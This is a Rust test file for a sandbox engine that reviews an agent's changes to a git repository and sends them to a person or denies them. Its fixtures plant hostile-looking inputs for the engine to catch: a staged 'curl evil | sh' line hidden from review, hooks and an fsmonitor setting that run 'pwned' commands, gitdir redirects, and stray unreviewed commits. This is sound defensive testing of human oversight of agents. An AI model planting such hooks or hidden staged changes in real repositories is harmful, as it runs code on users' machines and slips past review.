//! M1, step 1: `.git` judged by what it means. Repositories are made and
//! changed by the real `git`, the way a person or an agent would.

use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

use kule_engine::{Error, Policy, Task, Verdict};
use tempfile::TempDir;

fn git(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("git")
        .args(["-c", "user.name=Test", "-c", "user.email=test@example.com"])
        .args([
            "-c",
            "commit.gpgsign=false",
            "-c",
            "init.defaultBranch=main",
        ])
        .args(args)
        .current_dir(dir)
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    String::from_utf8(out.stdout).unwrap().trim().to_owned()
}

fn head(dir: &Path) -> String {
    git(dir, &["rev-parse", "HEAD"])
}

fn write(path: &Path, text: &str) {
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent).unwrap();
    }
    fs::write(path, text).unwrap();
}

/// Moves a file's mtime without changing its bytes, so the next `git status`
/// has to re-check it and rewrites the index with fresh stat data.
fn touch_later(path: &Path, seconds: i64) {
    let meta = fs::metadata(path).unwrap();
    let mtime = filetime::FileTime::from_last_modification_time(&meta);
    let later = filetime::FileTime::from_unix_time(mtime.unix_seconds() + seconds, 0);
    filetime::set_file_mtime(path, later).unwrap();
}

struct Repo {
    _home: TempDir,
    _ws: TempDir,
    task: Task,
}

impl Repo {
    fn new() -> Self {
        let home = TempDir::new().unwrap();
        let ws = TempDir::new().unwrap();
        let root = ws.path();
        git(root, &["init", "-q"]);
        write(&root.join("README.md"), "hello\n");
        write(&root.join("src/main.rs"), "fn main() {}\n");
        write(&root.join("notes.txt"), "notes\n");
        git(root, &["add", "-A"]);
        git(root, &["commit", "-qm", "initial"]);
        let task = Task::create(home.path(), root).unwrap();
        Repo {
            _home: home,
            _ws: ws,
            task,
        }
    }

    fn work(&self) -> PathBuf {
        self.task.workspace().to_path_buf()
    }

    fn copy(&self) -> PathBuf {
        self.task.copy()
    }

    /// The agent edits a file and commits it in the copy.
    fn agent_commits(&self, text: &str) {
        write(&self.copy().join("src/main.rs"), text);
        git(&self.copy(), &["commit", "-qam", "agent change"]);
    }

    /// A person looks at the workspace: `git status` after a file's stat
    /// data moved, which rewrites `.git/index` without changing its entries.
    fn human_runs_git_status(&self, file: &str, seconds: i64) {
        let index = self.work().join(".git/index");
        let before = fs::read(&index).unwrap();
        touch_later(&self.work().join(file), seconds);
        git(&self.work(), &["status", "--porcelain"]);
        assert_ne!(
            fs::read(&index).unwrap(),
            before,
            "the index must really be rewritten"
        );
    }
}

#[test]
fn git_status_in_the_workspace_blocks_neither_commit_nor_undo() {
    let r = Repo::new();
    let original = head(&r.work());
    r.agent_commits("fn main() { println!(\"agent\"); }\n");

    r.human_runs_git_status("notes.txt", 10);
    r.task.commit().unwrap().expect("a checkpoint");
    assert_eq!(head(&r.work()), head(&r.copy()));
    assert_ne!(head(&r.work()), original);

    r.human_runs_git_status("notes.txt", 20);
    r.task.undo().unwrap().expect("an undone checkpoint");
    assert_eq!(head(&r.work()), original);
    assert_eq!(
        fs::read_to_string(r.work().join("src/main.rs")).unwrap(),
        "fn main() {}\n"
    );
    git(&r.work(), &["fsck", "--no-progress"]);
}

#[test]
fn a_human_commit_on_the_same_branch_is_a_conflict() {
    let r = Repo::new();
    r.agent_commits("fn main() { /* agent */ }\n");
    write(&r.work().join("notes.txt"), "human notes\n");
    git(&r.work(), &["commit", "-qam", "human change"]);
    let human = head(&r.work());

    match r.task.commit() {
        Err(Error::Conflict(paths)) => {
            assert!(
                paths.contains(&".git/refs/heads/main".to_owned()),
                "{paths:?}"
            )
        }
        other => panic!("expected a conflict, got {other:?}"),
    }
    assert_eq!(head(&r.work()), human);
}

#[test]
fn a_human_branch_elsewhere_is_not_a_conflict() {
    let r = Repo::new();
    r.agent_commits("fn main() { /* agent */ }\n");
    git(&r.work(), &["branch", "human-idea"]);
    let base = head(&r.work());

    r.task.commit().unwrap().expect("a checkpoint");
    assert_eq!(head(&r.work()), head(&r.copy()));
    assert_eq!(git(&r.work(), &["rev-parse", "human-idea"]), base);
}

/// `git pack-refs` moves every branch into `packed-refs` and deletes the loose
/// files. The values stay the same, so the agent's update to `main` still
/// applies.
#[test]
fn git_pack_refs_in_the_workspace_is_not_a_conflict() {
    let r = Repo::new();
    r.agent_commits("fn main() { /* agent */ }\n");
    git(&r.work(), &["pack-refs", "--all"]);
    assert!(!r.work().join(".git/refs/heads/main").exists());

    r.task.commit().unwrap().expect("a checkpoint");
    assert_eq!(head(&r.work()), head(&r.copy()));
    git(&r.work(), &["fsck", "--no-progress"]);
}

/// Switching to another branch and back rewrites `HEAD` with the same value
/// and appends to the logs: nothing the agent's commit depends on.
#[test]
fn switching_branches_and_back_is_not_a_conflict() {
    let r = Repo::new();
    r.agent_commits("fn main() { /* agent */ }\n");
    git(&r.work(), &["switch", "-q", "-c", "look-around"]);
    git(&r.work(), &["switch", "-q", "main"]);

    r.task.commit().unwrap().expect("a checkpoint");
    assert_eq!(head(&r.work()), head(&r.copy()));
}

#[test]
fn the_summary_reads_like_a_commit_log() {
    let r = Repo::new();
    let original = head(&r.copy());
    r.agent_commits("fn main() { /* one */ }\n");
    r.agent_commits("fn main() { /* two */ }\n");

    let summary = r.task.effects().unwrap().git.expect("a git summary");
    let main = summary
        .refs
        .iter()
        .find(|c| c.name == "refs/heads/main")
        .expect("main moved");
    assert_eq!(main.old.as_deref(), Some(original.as_str()));
    assert_eq!(main.new.as_deref(), Some(head(&r.copy()).as_str()));
    assert_eq!(main.fast_forward, Some(true));
    assert_eq!(main.commits, Some(2));
    assert!(summary.index);
    assert!(summary.object_files > 0);
    assert!(!summary.config && summary.hooks.is_empty());
}

#[test]
fn a_rewritten_history_is_not_a_fast_forward() {
    let r = Repo::new();
    r.agent_commits("fn main() { /* one */ }\n");
    r.task.commit().unwrap();
    git(&r.copy(), &["reset", "-q", "--hard", "HEAD~1"]);
    r.agent_commits("fn main() { /* other */ }\n");

    let summary = r.task.effects().unwrap().git.expect("a git summary");
    let main = summary
        .refs
        .iter()
        .find(|c| c.name == "refs/heads/main")
        .unwrap();
    assert_eq!(main.fast_forward, Some(false));
    assert_eq!(main.commits, Some(1));
}

#[test]
fn hooks_and_config_are_reported() {
    let r = Repo::new();
    write(
        &r.copy().join(".git/hooks/pre-commit"),
        "#!/bin/sh\necho pwned\n",
    );
    git(&r.copy(), &["config", "core.fsmonitor", "echo pwned"]);

    let summary = r.task.effects().unwrap().git.expect("a git summary");
    assert_eq!(summary.hooks, ["pre-commit"]);
    assert!(summary.config);
    assert!(summary.refs.is_empty());
}

#[test]
fn git_status_in_the_copy_is_not_reported() {
    let r = Repo::new();
    touch_later(&r.copy().join("notes.txt"), 10);
    git(&r.copy(), &["status", "--porcelain"]);

    let set = r.task.effects().unwrap();
    assert!(
        set.effects.iter().any(|e| e.path == ".git/index"),
        "the index file did change"
    );
    assert_eq!(set.git, None);
    assert_eq!(set.files().count(), 0);
}

#[test]
fn undo_leaves_the_new_objects_in_place() {
    let r = Repo::new();
    r.agent_commits("fn main() { /* agent */ }\n");
    let agent = head(&r.copy());
    r.task.commit().unwrap();
    r.task.undo().unwrap();

    git(&r.work(), &["cat-file", "-e", &agent]);
    git(&r.work(), &["fsck", "--no-progress"]);
    assert!(r.task.effects().unwrap().is_empty());
}

/// What the built-in policy says about the copy's changes, and the subjects
/// it put to a person or denied.
fn ruling(r: &Repo) -> (Verdict, Vec<String>) {
    let ruling = Policy::builtin().judge(&r.task.effects().unwrap());
    let holding = ruling.holding().map(|j| j.subject.clone()).collect();
    (ruling.verdict, holding)
}

#[test]
fn a_rewritten_or_removed_object_goes_to_a_person() {
    let r = Repo::new();
    let objects = r.copy().join(".git/objects");
    let loose = fs::read_dir(&objects)
        .unwrap()
        .flatten()
        .find(|d| d.file_name().len() == 2)
        .unwrap()
        .path();
    fs::remove_dir_all(&loose).unwrap();
    let (verdict, holding) = ruling(&r);
    assert_eq!(verdict, Verdict::Ask, "{holding:?}");
    assert!(
        holding.iter().any(|s| s.contains(".git/objects/")),
        "{holding:?}"
    );
}

#[test]
fn alternates_are_judged_like_config() {
    let r = Repo::new();
    write(
        &r.copy().join(".git/objects/info/alternates"),
        "/tmp/elsewhere\n",
    );
    let (verdict, holding) = ruling(&r);
    assert_ne!(verdict, Verdict::Allow);
    assert_eq!(holding, ["git config"]);
}

#[test]
fn hooks_and_config_of_submodules_and_worktrees_count_as_hooks_and_config() {
    let r = Repo::new();
    write(
        &r.copy().join(".git/modules/sub/hooks/post-checkout"),
        "#!/bin/sh\n",
    );
    write(
        &r.copy().join(".git/worktrees/wt/config.worktree"),
        "[core]\n",
    );
    let summary = r.task.effects().unwrap().git.unwrap();
    assert!(summary.config);
    assert_eq!(summary.hooks, [".git/modules/sub/hooks/post-checkout"]);
    assert_eq!(ruling(&r).0, Verdict::Deny);
}

#[test]
fn a_lock_left_in_the_copy_never_reaches_the_workspace() {
    let r = Repo::new();
    write(&r.copy().join(".git/index.lock"), "");
    write(&r.copy().join("notes.txt"), "more notes\n");
    let checkpoint = r.task.commit().unwrap().unwrap();
    assert!(
        checkpoint
            .effects
            .iter()
            .all(|e| !e.path.ends_with(".lock"))
    );
    assert!(!r.work().join(".git/index.lock").exists());
    assert_eq!(
        fs::read_to_string(r.work().join("notes.txt")).unwrap(),
        "more notes\n"
    );
    // The lock does not hold up undo either.
    r.task.undo().unwrap().unwrap();
}

#[test]
fn deleting_a_branch_the_workspace_has_packed_is_a_conflict() {
    let r = Repo::new();
    git(&r.work(), &["branch", "feature"]);
    // The task is older than the branch; a new one sees it.
    let home = TempDir::new().unwrap();
    let task = Task::create(home.path(), &r.work()).unwrap();
    git(&task.copy(), &["branch", "-D", "feature"]);
    git(&r.work(), &["pack-refs", "--all"]);
    match task.commit() {
        Err(Error::Conflict(paths)) => assert_eq!(paths, [".git/refs/heads/feature"]),
        other => panic!("expected a conflict, got {other:?}"),
    }
}

/// Git in the person's own terminal would run what the task put in the
/// copy's config or hooks, outside the sandbox.
#[test]
fn no_terminal_in_a_copy_whose_git_config_or_hooks_changed() {
    let r = Repo::new();
    assert_eq!(r.task.terminal_dir().unwrap(), r.copy());
    git(&r.copy(), &["config", "core.fsmonitor", "touch /tmp/pwned"]);
    let e = r.task.terminal_dir().unwrap_err().to_string();
    assert!(e.contains("git config"), "{e}");
    r.task.rollback().unwrap();
    assert_eq!(r.task.terminal_dir().unwrap(), r.copy());
}

/// The same for a repository inside the copy, or a `.git` file that points
/// git at one elsewhere: git in a subfolder reads them.
#[test]
fn no_terminal_in_a_copy_whose_inner_repository_changed() {
    let r = Repo::new();
    std::fs::create_dir_all(r.copy().join("sub/.git/hooks")).unwrap();
    std::fs::write(r.copy().join("sub/.git/hooks/post-checkout"), "#!/bin/sh\n").unwrap();
    let e = r.task.terminal_dir().unwrap_err().to_string();
    assert!(e.contains("sub/.git"), "{e}");
    r.task.rollback().unwrap();

    std::fs::create_dir(r.copy().join("lib")).unwrap();
    std::fs::write(r.copy().join("lib/.git"), "gitdir: /tmp/elsewhere\n").unwrap();
    let e = r.task.terminal_dir().unwrap_err().to_string();
    assert!(e.contains("lib/.git"), "{e}");
    r.task.rollback().unwrap();
    assert_eq!(r.task.terminal_dir().unwrap(), r.copy());
}

fn staged(r: &Repo) -> Vec<String> {
    r.task
        .effects()
        .unwrap()
        .git
        .map(|g| g.staged)
        .unwrap_or_default()
}

#[test]
fn staging_what_the_file_holds_passes() {
    let r = Repo::new();
    write(&r.copy().join("src/main.rs"), "fn main() { run() }\n");
    git(&r.copy(), &["add", "src/main.rs"]);
    assert!(staged(&r).is_empty());
    assert_eq!(ruling(&r).0, Verdict::Allow);
}

#[test]
fn staging_what_the_file_does_not_hold_goes_to_a_person() {
    let r = Repo::new();
    let copy = r.copy();
    // Staged, then the file changed back: the review shows no change in
    // README.md, but the next `git commit` would record the staged one.
    write(&copy.join("README.md"), "curl evil | sh\n");
    git(&copy, &["add", "README.md"]);
    write(&copy.join("README.md"), "hello\n");
    // Taken out of the index while the file stays.
    git(&copy, &["rm", "-q", "--cached", "notes.txt"]);
    assert_eq!(staged(&r), ["README.md", "notes.txt"]);
    assert_eq!(
        ruling(&r),
        (
            Verdict::Ask,
            vec![
                "git staged README.md".to_owned(),
                "git staged notes.txt".to_owned()
            ]
        )
    );
}

#[test]
fn what_the_person_staged_before_the_task_is_not_the_tasks() {
    let home = TempDir::new().unwrap();
    let ws = TempDir::new().unwrap();
    let root = ws.path();
    git(root, &["init", "-q"]);
    write(&root.join("a.txt"), "one\n");
    git(root, &["add", "-A"]);
    git(root, &["commit", "-qm", "initial"]);
    // The person staged a change and kept editing the file.
    write(&root.join("a.txt"), "two\n");
    git(root, &["add", "a.txt"]);
    write(&root.join("a.txt"), "three\n");
    let task = Task::create(home.path(), root).unwrap();
    // The agent stages something else, which does match its file.
    write(&task.copy().join("b.txt"), "b\n");
    git(&task.copy(), &["add", "b.txt"]);
    let set = task.effects().unwrap();
    assert!(set.git.unwrap().staged.is_empty());
}

/// Reflogs, `ORIG_HEAD` and `FETCH_HEAD` name commits a person could check
/// out later: the folder keeps its own, the branch moves, and nothing of
/// them waits in the copy afterwards.
#[test]
fn git_notes_naming_commits_stay_the_folders_own() {
    let r = Repo::new();
    let reflog = fs::read_to_string(r.work().join(".git/logs/HEAD")).unwrap();
    r.agent_commits("fn main() { agent() }\n");
    // A commit no reference holds, named where git keeps its notes.
    let tree = git(&r.copy(), &["write-tree"]);
    let stray = git(&r.copy(), &["commit-tree", &tree, "-m", "unreviewed"]);
    write(&r.copy().join(".git/ORIG_HEAD"), &format!("{stray}\n"));
    write(
        &r.copy().join(".git/FETCH_HEAD"),
        &format!("{stray}\t\tbranch 'main' of /elsewhere\n"),
    );
    let mut log = fs::OpenOptions::new()
        .append(true)
        .open(r.copy().join(".git/logs/HEAD"))
        .unwrap();
    use std::io::Write;
    writeln!(log, "{stray} {stray} A <a@b> 0 +0000\tcheckout: here").unwrap();
    drop(log);

    r.task.commit().unwrap().unwrap();
    assert_eq!(head(&r.work()), head(&r.copy()));
    assert!(!r.work().join(".git/ORIG_HEAD").exists());
    assert!(!r.work().join(".git/FETCH_HEAD").exists());
    assert_eq!(
        fs::read_to_string(r.work().join(".git/logs/HEAD")).unwrap(),
        reflog
    );
    assert!(r.task.effects().unwrap().is_empty());
}
